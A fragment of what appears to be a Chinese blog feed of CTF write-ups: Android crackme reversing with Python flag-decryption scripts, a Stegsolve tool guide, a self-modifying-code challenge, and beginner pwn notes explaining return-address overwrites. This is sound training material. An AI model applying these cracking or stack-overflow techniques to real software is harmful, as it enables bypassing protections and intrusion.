alt="image-20210114144843522"></p><p>目录下此时多了一个appdebug文件夹，里面内容是apk的xml文件、AndroidManifest.xml和图片等</p><p>我们找到parseText函数进行分析</p><p>这里还有一个知识点关于JNI的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">出于效率的问题，很多情况下，我们需要在上层的Java代码中调用底层 C或C++实现，这时jni就可以大显身手了。jni（Java Native Interface）允许Java代码和其他语言写的代码进行交互，使用java与本地已编译的代码交互，通常会丧失平台可移植性。但是，有些情况下这样 做是可以接受的，甚至是必须的。例如，使用一些旧的库，与硬件、操作系统进行交互，或者为了提高程序的性能。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT void JNICALL Java_com_example_jnitest_JniTest_hello  (JNIEnv *, jclass);</span><br></pre></td></tr></table></figure><p>JNIEnv *是任意一个本地方法的第一个参数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152251.png" alt="image-20210114150133131"></p><p>因此我们对a1按Y，改成JNIEnv *a1</p><p>接着来分析</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152258.png" alt="image-20210114150951455"></p><p>找到相应的地址了”com/njctf/mobile/easycrack” ，同时将messageMe函数的返回值存到了v7</p><p>返回Java层，查看messageMe函数，将其直接赋值java包的名字，然后运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">messageMe</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">String str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">51</span>;</span><br><span class="line">String[] localObject = <span class="string">&quot;com/njctf/mobile/easycrack&quot;</span>.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>[] localObject1 = localObject[(localObject.length - <span class="number">1</span>)].toCharArray();</span><br><span class="line"><span class="keyword">int</span> k = localObject1.length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">&#123;</span><br><span class="line">  j ^= localObject1[i];</span><br><span class="line">  str = str + (<span class="keyword">char</span>)j;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(str);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到字符串”V7D=^,M.E”</p><p>在接着看ida中的反汇编</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152351.png" alt="image-20210114152931367"></p><p>又将v7赋值给v8，v8赋值给了v9，将输入的字符串存在了v10</p><p>v11存了输入字符串的长度，v12存了字符串”V7D=^,M.E”的长度（9）</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153208.png" alt="image-20210114160105872"></p><p>这就是将输入的字符串与”V7D=^,M.E”进行异或，若输入的字符串还有剩，”V7D=^,M.E”就从头开始异或，结果存到了v13中</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153212.png" alt="image-20210114160559677"></p><p>接着将v29数据初始化，将v28赋值”I_am_the_key”，v17存着v28的长度(12)，接着进入init函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153214.png" alt="image-20210114160916846"></p><p>简单算法，写个脚本就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a1 = []</span><br><span class="line">a2 = <span class="string">&quot;I_am_the_key&quot;</span></span><br><span class="line">v11 = <span class="string">&quot;&quot;</span></span><br><span class="line">a3 = <span class="built_in">len</span>(a2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    a1.append(i)</span><br><span class="line">    v11 = v11 + a2[i%a3]</span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v9 = a1[i]</span><br><span class="line">    v7 = (v7 + v9 + <span class="built_in">ord</span>(v11[i])) % <span class="number">256</span></span><br><span class="line">    a1[i] = a1[v7]</span><br><span class="line">    a1[v7] = v9</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;:d&#125;&quot;</span>.<span class="built_in">format</span>(a1[i]),end = <span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure><p>得到key</p><p>接着看ida发现加密函数</p><p>v29现在是key，v13是异或后的字符串，v11是字符串的长度</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153220.png" alt="image-20210114162655203"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153221.png" alt="image-20210114162839087"></p><p>又是一些异或操作，返回看看加密之后做了什么</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153224.png" alt="image-20210114163143450"></p><p>将加密后的数据转成16进制，在与compare字符串比较一样就正确，点开compare</p><p>得到C8E4EF0E4DCCA683088134F8635E970EEAD9E27</p><p>这就是最终加密后的16进制字符串，那我们直接逆推回去就好了，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">result = [<span class="number">0x39</span>,<span class="number">0xa9</span>,<span class="number">0x72</span>,<span class="number">0x2d</span>,<span class="number">0xe8</span>,<span class="number">0x58</span>,<span class="number">0x26</span>,<span class="number">0x32</span>,<span class="number">0x81</span>,<span class="number">0xd</span>,<span class="number">0xac</span>,<span class="number">0x49</span>,<span class="number">0xbb</span>,<span class="number">0x10</span>,<span class="number">0x46</span>,<span class="number">0x65</span>,<span class="number">0xb3</span>,<span class="number">0x92</span>,<span class="number">0xf</span>,<span class="number">0x84</span>,<span class="number">0xb8</span>,<span class="number">0xbf</span>,<span class="number">0xf2</span>,<span class="number">0x52</span>,<span class="number">0xe3</span>,<span class="number">0x5b</span>,<span class="number">0xfc</span>,<span class="number">0xd5</span>,<span class="number">0x59</span>,<span class="number">0x6a</span>,<span class="number">0xf0</span>,<span class="number">0x5d</span>,<span class="number">0x60</span>,<span class="number">0x69</span>,<span class="number">0x16</span>,<span class="number">0x8e</span>,<span class="number">0xfb</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,<span class="number">0xbc</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0x57</span>,<span class="number">0xad</span>,<span class="number">0x44</span>,<span class="number">0x7c</span>,<span class="number">0x95</span>,<span class="number">0xda</span>,<span class="number">0xb7</span>,<span class="number">0x47</span>,<span class="number">0xdb</span>,<span class="number">0x35</span>,<span class="number">0x3c</span>,<span class="number">0xd2</span>,<span class="number">0x23</span>,<span class="number">0xc5</span>,<span class="number">0xa8</span>,<span class="number">0xb</span>,<span class="number">0x9f</span>,<span class="number">0x31</span>,<span class="number">0xd8</span>,<span class="number">0x1f</span>,<span class="number">0x3f</span>,<span class="number">0xb0</span>,<span class="number">0x2e</span>,<span class="number">0xe1</span>,<span class="number">0x5a</span>,<span class="number">0x4a</span>,<span class="number">0xf9</span>,<span class="number">0x1</span>,<span class="number">0x54</span>,<span class="number">0xa7</span>,<span class="number">0xa5</span>,<span class="number">0xee</span>,<span class="number">0x8</span>,<span class="number">0x99</span>,<span class="number">0x63</span>,<span class="number">0x9b</span>,<span class="number">0x50</span>,<span class="number">0xbd</span>,<span class="number">0x5</span>,<span class="number">0xf7</span>,<span class="number">0xcb</span>,<span class="number">0xab</span>,<span class="number">0x22</span>,<span class="number">0xc2</span>,<span class="number">0x8a</span>,<span class="number">0x38</span>,<span class="number">0x7d</span>,<span class="number">0x6</span>,<span class="number">0xb1</span>,<span class="number">0xc0</span>,<span class="number">0x4e</span>,<span class="number">0x74</span>,<span class="number">0x3a</span>,<span class="number">0xe5</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xa3</span>,<span class="number">0x73</span>,<span class="number">0x89</span>,<span class="number">0x9e</span>,<span class="number">0xba</span>,<span class="number">0x88</span>,<span class="number">0x3d</span>,<span class="number">0x28</span>,<span class="number">0x62</span>,<span class="number">0x8f</span>,<span class="number">0xfd</span>,<span class="number">0x43</span>,<span class="number">0x98</span>,<span class="number">0x4d</span>,<span class="number">0x56</span>,<span class="number">0xb2</span>,<span class="number">0xc</span>,<span class="number">0x29</span>,<span class="number">0x6e</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0xe0</span>,<span class="number">0xe9</span>,<span class="number">0xf6</span>,<span class="number">0x9c</span>,<span class="number">0x13</span>,<span class="number">0xed</span>,<span class="number">0xf8</span>,<span class="number">0xc4</span>,<span class="number">0x20</span>,<span class="number">0x87</span>,<span class="number">0x2</span>,<span class="number">0x7b</span>,<span class="number">0xf1</span>,<span class="number">0x6d</span>,<span class="number">0xc7</span>,<span class="number">0x8c</span>,<span class="number">0x9d</span>,<span class="number">0x86</span>,<span class="number">0x3b</span>,<span class="number">0x66</span>,<span class="number">0xfa</span>,<span class="number">0xb6</span>,<span class="number">0x42</span>,<span class="number">0x6f</span>,<span class="number">0x14</span>,<span class="number">0xd0</span>,<span class="number">0x19</span>,<span class="number">0xaf</span>,<span class="number">0x11</span>,<span class="number">0x21</span>,<span class="number">0x96</span>,<span class="number">0x85</span>,<span class="number">0x91</span>,<span class="number">0xb5</span>,<span class="number">0xa0</span>,<span class="number">0x1b</span>,<span class="number">0x18</span>,<span class="number">0xa6</span>,<span class="number">0xa2</span>,<span class="number">0x4b</span>,<span class="number">0x40</span>,<span class="number">0xd4</span>,<span class="number">0x8d</span>,<span class="number">0x2a</span>,<span class="number">0x8b</span>,<span class="number">0x5c</span>,<span class="number">0x2c</span>,<span class="number">0xe6</span>,<span class="number">0xfe</span>,<span class="number">0xa4</span>,<span class="number">0x30</span>,<span class="number">0xe7</span>,<span class="number">0xff</span>,<span class="number">0xc8</span>,<span class="number">0x5f</span>,<span class="number">0xe2</span>,<span class="number">0x1c</span>,<span class="number">0xdf</span>,<span class="number">0xae</span>,<span class="number">0x7f</span>,<span class="number">0xc3</span>,<span class="number">0x61</span>,<span class="number">0xef</span>,<span class="number">0x90</span>,<span class="number">0x6c</span>,<span class="number">0x51</span>,<span class="number">0x2f</span>,<span class="number">0xec</span>,<span class="number">0x12</span>,<span class="number">0x7a</span>,<span class="number">0xaa</span>,<span class="number">0xdd</span>,<span class="number">0x77</span>,<span class="number">0xf5</span>,<span class="number">0x4</span>,<span class="number">0xd9</span>,<span class="number">0x83</span>,<span class="number">0x33</span>,<span class="number">0xeb</span>,<span class="number">0x80</span>,<span class="number">0x27</span>,<span class="number">0x3</span>,<span class="number">0xb4</span>,<span class="number">0x9</span>,<span class="number">0x37</span>,<span class="number">0x6b</span>,<span class="number">0x41</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0xf3</span>,<span class="number">0x24</span>,<span class="number">0xf4</span>,<span class="number">0xc9</span>,<span class="number">0x7</span>,<span class="number">0xd1</span>,<span class="number">0x45</span>,<span class="number">0x70</span>,<span class="number">0xa1</span>,<span class="number">0xd7</span>,<span class="number">0x34</span>,<span class="number">0x93</span>,<span class="number">0x15</span>,<span class="number">0xca</span>,<span class="number">0x4c</span>,<span class="number">0xcd</span>,<span class="number">0x97</span>,<span class="number">0xb9</span>,<span class="number">0xea</span>,<span class="number">0x0</span>,<span class="number">0x5e</span>,<span class="number">0x1a</span>,<span class="number">0x9a</span>,<span class="number">0xcf</span>,<span class="number">0x79</span>,<span class="number">0xa</span>,<span class="number">0x3e</span>,<span class="number">0x82</span>,<span class="number">0xd3</span>,<span class="number">0x68</span>,<span class="number">0x75</span>,<span class="number">0x64</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0xe</span>,<span class="number">0xbe</span>,<span class="number">0x1d</span>,<span class="number">0xe4</span>,<span class="number">0xc1</span>,<span class="number">0xc6</span>,<span class="number">0xde</span>,<span class="number">0xcc</span>,<span class="number">0x1e</span>,<span class="number">0x17</span>,<span class="number">0xd6</span>,<span class="number">0xdc</span>,<span class="number">0x53</span>,<span class="number">0x76</span>]</span><br><span class="line">a2= [<span class="number">0xC8</span>,<span class="number">0xE4</span>,<span class="number">0xEF</span>,<span class="number">0x0E</span>,<span class="number">0x4D</span>,<span class="number">0xCC</span>,<span class="number">0xA6</span>,<span class="number">0x83</span>,<span class="number">0x08</span>,<span class="number">0x81</span>,<span class="number">0x34</span>,<span class="number">0xF8</span>,<span class="number">0x63</span>,<span class="number">0x5E</span>,<span class="number">0x97</span>,<span class="number">0x0E</span>,<span class="number">0xEA</span>,<span class="number">0xD9</span>,<span class="number">0xE2</span>,<span class="number">0x77</span>,<span class="number">0xF3</span>,<span class="number">0x14</span>,<span class="number">0x86</span>,<span class="number">0x9F</span>,<span class="number">0x7E</span>,<span class="number">0xF5</span>,<span class="number">0x19</span>,<span class="number">0x8A</span>,<span class="number">0x2A</span>,<span class="number">0xA4</span>]</span><br><span class="line">a3 = <span class="built_in">len</span>(a2)</span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a3):</span><br><span class="line">    v3 = (v3 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    v5 = result[v3]</span><br><span class="line">    v4 = (v5 + v4) % <span class="number">256</span></span><br><span class="line">    result[v3] = result[v4]</span><br><span class="line">    result[v4] = v5</span><br><span class="line">    a2[i] = a2[i]^(result[(result[v3]+v5)%<span class="number">256</span>])</span><br><span class="line">ss=<span class="string">&quot;V7D=^,M.E&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a3):</span><br><span class="line">    j=i%<span class="number">9</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(ss[j])^a2[i])</span><br><span class="line">    j=j+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果为It_s_a_easyCrack_for_beginners</p><h1 id="fake-func"><a href="#fake-func" class="headerlink" title="fake-func"></a>fake-func</h1><p>apk文件，用Android Killer直接处理，看java层</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153242.png" alt="image-20210114171341081"></p><p>发现判断使用check模块的checkflag</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153245.png" alt="image-20210114171458751"></p><p>这里用了native层函数</p><p>直接到so里看看</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153249.png" alt="image-20210114202052958"></p><p>将输入的字符串传到v3</p><p>进入sub_E08函数后与off_6004字符串（”c2RuaXNjc2RuaXNjYWJjZA==”）比较</p><p>看看sub_E08函数看看</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153251.png" alt="image-20210114202244300"></p><p>将off_6004字符串赋值给v0，在将v1存入off_6004字符串的长度</p><p>接着看sub_16D8函数，发现</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153254.png" alt="image-20210114202900334"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153257.png" alt="image-20210114202907213"></p><p>可知是base64解密</p><p>将字符串解密得到新的字符串”sdniscsdniscabcd”</p><p>对 sub_E08()函数按X看看还有谁调用过</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153300.png" alt="image-20210114203331086"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153303.png" alt="image-20210114203338870"></p><p>拿到”K4/7/faihmk9/WEMlfuFdpgrP86ckd4oQQ/UeAiZdx8=”</p><p>在看看sub_1388函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153305.png" alt="image-20210114203925707"></p><p>在看看sub_F24函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153444.png" alt="image-20210114211803202"></p><p>byte_4255</p><p>查看发现256个</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153308.png" alt="image-20210114211920391"></p><p>加密的文本结尾有一个等号，又不是base，怀疑是AES，直接爆破</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153310.png" alt="image-20210114212619342"></p><p>flag{fake_func_3nfxvs}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;easyeasy-200&quot;&gt;&lt;a href=&quot;#easyeasy-200&quot; class=&quot;headerlink&quot; title=&quot;easyeasy-200&quot;&gt;&lt;/a&gt;easyeasy-200&lt;/h1&gt;&lt;p&gt;安卓逆向&lt;/p&gt;
&lt;p&gt;用Android Killer直接反</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>Stegsolve使用介绍</title>
    <link href="http://example.com/2021/08/13/Stegsolve%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2021/08/13/Stegsolve%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2021-08-13T11:39:43.650Z</published>
    <updated>2021-08-13T07:53:37.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Stegsolve使用介绍"><a href="#Stegsolve使用介绍" class="headerlink" title="Stegsolve使用介绍"></a>Stegsolve使用介绍</h1><p>ctf misc方向难免会遇到需要处理图片的问题</p><p>而一开始我都用ps，那玩意太大了，而Stegsolve用起来很方便，所以在这记录一下使用方法什么的</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101130987.png" alt="image-20210810113033872"></p><p>Open 打开文件</p><p>Save As 保存文件</p><p>Exit 退出</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101131223.png" alt="image-20210810113110173"></p><h2 id="File-Format"><a href="#File-Format" class="headerlink" title="File Format"></a>File Format</h2><p>查看文件格式</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101132798.png" alt="image-20210810113253737"></p><p>有可能在这里找到flag</p><h2 id="Data-Extract"><a href="#Data-Extract" class="headerlink" title="Data Extract"></a>Data Extract</h2><p>数据提取</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101134228.png" alt="image-20210810113427164"></p><h3 id="Bit-Planes部分"><a href="#Bit-Planes部分" class="headerlink" title="Bit Planes部分"></a>Bit Planes部分</h3><p>Alpha是透明度</p><p>Red Green Blue是红绿蓝 数字越大该颜色的亮度越高，数字越小该颜色的亮度越低</p><p>亮度级别为256个级别 2^8 7~0</p><h3 id="Order-settings"><a href="#Order-settings" class="headerlink" title="Order settings"></a>Order settings</h3><p><strong>Extract By</strong></p><p>额外的</p><p>Row 行</p><p>Column 纵</p><p>像素使用RGB(0-255,0-255,0-255)表示</p><p><strong>Bit Order</strong></p><p>位顺序</p><p>MSB First  一串的最高位</p><p>LSB First 一串为最低位</p><p><strong>Bit Plane Order</strong></p><p>位平面顺序</p><p>RGB的顺序</p><h2 id="Steregram-Solve"><a href="#Steregram-Solve" class="headerlink" title="Steregram Solve"></a>Steregram Solve</h2><p>立体试图， 左右控制偏移 </p><h2 id="Frame-Browser"><a href="#Frame-Browser" class="headerlink" title="Frame Browser"></a>Frame Browser</h2><p>按帧浏览，可以看GIF的动图，像buuctf的金三胖那题就是藏帧里</p><h2 id="Image-Combiner"><a href="#Image-Combiner" class="headerlink" title="Image Combiner"></a>Image Combiner</h2><p>拼图</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Stegsolve使用介绍&quot;&gt;&lt;a href=&quot;#Stegsolve使用介绍&quot; class=&quot;headerlink&quot; title=&quot;Stegsolve使用介绍&quot;&gt;&lt;/a&gt;Stegsolve使用介绍&lt;/h1&gt;&lt;p&gt;ctf misc方向难免会遇到需要处理图片的问题&lt;/</summary>
      
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>smc自解密</title>
    <link href="http://example.com/2021/08/13/smc%E8%87%AA%E8%A7%A3%E5%AF%86/"/>
    <id>http://example.com/2021/08/13/smc%E8%87%AA%E8%A7%A3%E5%AF%86/</id>
    <published>2021-08-13T11:39:43.647Z</published>
    <updated>2021-08-13T07:50:43.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BABYRE"><a href="#BABYRE" class="headerlink" title="BABYRE"></a>BABYRE</h1><p>ida打开后看主函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153506.png" alt="image-20210125124251306"></p><p>得知先将judge数组里头的数据进行了异或，点开看看</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153509.png" alt="image-20210125172059446"></p><p>后面看judge是一个函数才对</p><p>这应该是需要idc或者是python脚本来讲数据进行一些改变</p><p>这里需要修改程序中原有的数据</p><p><strong>smc自解密</strong></p><table><thead><tr><th>返回值</th><th>函数名</th><th>参数</th><th>操作</th></tr></thead><tbody><tr><td>void</td><td>PatchByte</td><td>long addr, long val</td><td>设置虚拟地址addr处的一个字节值</td></tr></tbody></table><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153512.png" alt="image-20210125175000268"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153514.png" alt="image-20210125175358009"></p><p>得到了判断函数和比较字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x7f</span>,<span class="number">0x6b</span>,<span class="number">0x37</span>,<span class="number">0x64</span>,<span class="number">0x3b</span>,<span class="number">0x56</span>,<span class="number">0x60</span>,<span class="number">0x3b</span>,<span class="number">0x6e</span>,<span class="number">0x70</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]^i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>flag{n1c3_j0b}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BABYRE&quot;&gt;&lt;a href=&quot;#BABYRE&quot; class=&quot;headerlink&quot; title=&quot;BABYRE&quot;&gt;&lt;/a&gt;BABYRE&lt;/h1&gt;&lt;p&gt;ida打开后看主函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://sunqiz.oss-cn-beij</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn初学笔记</title>
    <link href="http://example.com/2021/08/13/pwn%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/08/13/pwn%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2021-08-13T11:39:43.645Z</published>
    <updated>2021-08-13T07:55:58.435Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn初学笔记"><a href="#pwn初学笔记" class="headerlink" title="pwn初学笔记"></a>pwn初学笔记</h1><p>师傅们的学习博客：</p><p><a href="https://blog.csdn.net/qq_42880719/article/details/119187995?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_42880719/article/details/119187995?spm=1001.2014.3001.5501</a></p><p><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p><p><a href="https://www.yuque.com/cyberangel">https://www.yuque.com/cyberangel</a></p><p><a href="https://www.yuque.com/hxfqg9/bin/zzg02e#62Pxt">https://www.yuque.com/hxfqg9/bin/zzg02e#62Pxt</a></p><p>靶场：<br><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a><br><a href="https://ctf.show/challenges">https://ctf.show/challenges</a><br><a href="https://pwnable.tw/challenge/">https://pwnable.tw/challenge/</a><br><a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a><br><a href="https://bamboofox.cs.nctu.edu.tw/courses">https://bamboofox.cs.nctu.edu.tw/courses</a> </p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="汇编知识"><a href="#汇编知识" class="headerlink" title="汇编知识"></a>汇编知识</h3><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</p><p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p><p>一般情况下C写的程序都是cdecl call</p><p>在函数调用的时候 call可以看作pop eip,jmp func</p><p>在函数内部还有一个push ebp</p><p>所以在覆盖到栈上保存的ret返回地址前还有一个ebp(rbp)需要覆盖 这个就是多出来的4(8)个字节</p><p>esp始终指向栈顶，ebp是在堆栈中寻址用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">push　　　    ebp　　　　　　　　　   ;ebp入栈　</span><br><span class="line">mov　　　　 ebp,　esp　　　　　　    ;因为esp是堆栈指针，无法暂借使用，所以得用ebp来存取堆栈　</span><br><span class="line">sub　　　　  esp,　4*5　　　　　　　  ;下面的wsprintf一共使用了5个参数，每个参数占用4个字节，所以要入栈4*5个字节　</span><br><span class="line">push　　　　1111　</span><br><span class="line">push　　　　2222　</span><br><span class="line">push　　　　3333　</span><br><span class="line">push　　　　offset　szFormat　</span><br><span class="line">push　　　　offset　szOut　</span><br><span class="line">call　　　　  wsprintf　　　　　　　　  ;调用wsprintf　</span><br><span class="line">add　　　 　esp,　4*5　　　　　　　　;堆栈使用完毕，“还”回4*5个字节给系统　</span><br><span class="line">…　</span><br><span class="line">mov　　　　esp,　ebp　　　　　　　　;恢复esp的值　</span><br><span class="line">pop　　　　ebp　　　　　　　　　　　;ebp出栈　</span><br><span class="line">ret　</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210726111256.png"></p><p>找到了，ebp-xxxh是数组在栈中的高度，也就是大小。esp+xxxh是数组在栈中的位置，是数组到esp的距离</p><p>如果是输入char 的话，就覆盖满char</p><p>然后覆盖ebp</p><p>然后修改返回地址</p><p>跳转到你想要跳的地方</p><h4 id="函数完整的调用，返回过程"><a href="#函数完整的调用，返回过程" class="headerlink" title="函数完整的调用，返回过程"></a>函数完整的调用，返回过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">调用者：</span><br><span class="line">push 调用参数</span><br><span class="line">call 函数（push eip ；jmp swap）</span><br><span class="line"></span><br><span class="line">被调用者：</span><br><span class="line">push ebp （存调用者的ebp）</span><br><span class="line">mov ebp,esp （开辟栈空间）</span><br><span class="line">sub esp,4 # sub esp，4 的4不是定值，看需求</span><br><span class="line"></span><br><span class="line">被调用者</span><br><span class="line">leave（mov esp,ebp ;  pop ebp）</span><br><span class="line">ret (pop eip)</span><br><span class="line"></span><br><span class="line">调用者</span><br><span class="line">add esp,xxx （将被调用者的参数弹出，平栈）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" 